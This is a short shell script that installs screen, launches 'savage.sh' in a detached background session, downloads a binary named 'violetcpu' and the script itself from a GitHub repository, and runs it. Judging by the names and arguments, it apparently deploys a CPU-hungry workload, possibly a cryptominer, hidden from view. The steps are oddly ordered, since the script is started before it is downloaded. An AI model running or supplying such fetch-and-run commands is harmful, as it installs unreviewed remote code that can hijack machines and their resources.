#!/bin/sh

sudo apt update

sudo apt install screen -y

screen -dmS savage.sh ./savage.sh 65 75

wget https://github.com/angkii/bh/raw/main/violetcpu

wget https://raw.githubusercontent.com/angkii/bh/main/savage.sh

chmod +x savage.sh

./savage.sh
